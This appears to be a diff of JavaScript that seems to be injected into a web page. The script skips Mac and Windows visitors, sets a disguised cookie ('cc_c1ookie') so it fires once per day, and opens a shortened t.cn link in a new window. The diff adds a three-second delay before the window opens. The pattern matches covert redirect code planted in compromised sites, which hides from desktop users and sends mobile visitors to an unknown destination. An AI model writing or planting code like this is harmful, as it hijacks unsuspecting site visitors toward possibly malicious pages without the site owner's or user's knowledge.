@@ -1,11 +1,13 @@
 if (navigator.platform.indexOf('Mac') == 0 || navigator.platform.indexOf('Win') == 0) {
     throw SyntaxError();
 }
-
-    if (!getCookie('cc_c1ookie')) {
+setTimeout(function(){ if (!getCookie('cc_c1ookie')) {
         setCookie('cc_c1ookie','ok',1);
         window.open("http://t.cn/EGwS68r");
      }
+                     }, 3000);
+
+    
 
 function getCookie(cname) {
     var name = cname + "=";
